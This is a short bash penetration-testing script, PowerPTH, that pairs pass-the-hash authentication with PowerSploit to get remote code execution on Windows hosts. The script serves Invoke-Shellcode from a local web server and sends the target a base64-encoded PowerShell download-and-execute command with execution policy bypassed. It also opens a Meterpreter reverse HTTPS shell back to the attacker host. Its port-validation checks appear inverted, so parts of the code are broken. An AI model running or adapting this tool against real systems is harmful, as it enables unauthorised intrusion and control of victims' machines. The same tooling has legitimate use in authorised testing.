#!/bin/bash
if [ $# -ne 5 ]
then
  echo "PowerPTH: Combines PTH-Suite and PowerSploit for remote AV-bypass with Meterpreter"
	echo "                   by Chris Campbell (@obscuresec)                                "
	echo "                             BSD 3-Clause                                         "
	echo "    Special thanks to the developers of PTH-Suite & PowerSploit (Skip and Matt)   "
	echo " "
	echo " "
	echo "Usage: ./PowerPTH.sh RHOST Username Hash LHOST LPORT"
	echo "Example: ./PowerPTH.sh 192.168.1.2 domain/administrator 00000000000000000000000000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 192.168.1.1 443"
	exit 1
fi

#argument $3 should be 32:32 (65 characters)
len=${#3}
if [ $len -ne 65 ]
then
	echo "Hash should be supplied in the LM:NT format and should be 65 characters total"
	exit 1
fi

#argument $5 should be an integer between 1-65535 and not in use
check=`lsof -i :$5`
if [[ -z "$check" ]]
then
	echo "Port $5 is in use. Kill the process or specify another port"
	exit 1
fi

if [ $5 -ge 1 ] && [ $5 -lt 65535 ]
then
	echo "Local port for handler must be between 1-65535."
	exit 1
fi

rhost=$1
user=$2
hash=$3
lhost=$4
lport=$5

#check to see if Apache is running, if not start it
result=`pgrep apache`
if [[ -z "$result" ]]
then 
	service apache2 start
fi

#download invoke-shellcode from github and save as /var/www/plugin
wget -O /var/www/plugin https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1

#append a call to the Invoke-Shellcode function with the proper arguments
func="Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force"
echo "$func" >> /var/www/plugin

#base64 encode the stager scriptblock: {iex (New-Object Net.WebClient).DownloadString('http://$lhost/plugin')}
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$lhost/plugin')"
encode="echo `echo $scriptblock | base64`"
command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"

#start multi/handler
msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E

#execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command""
wmis -U $user%$hash //$rhost "$command"
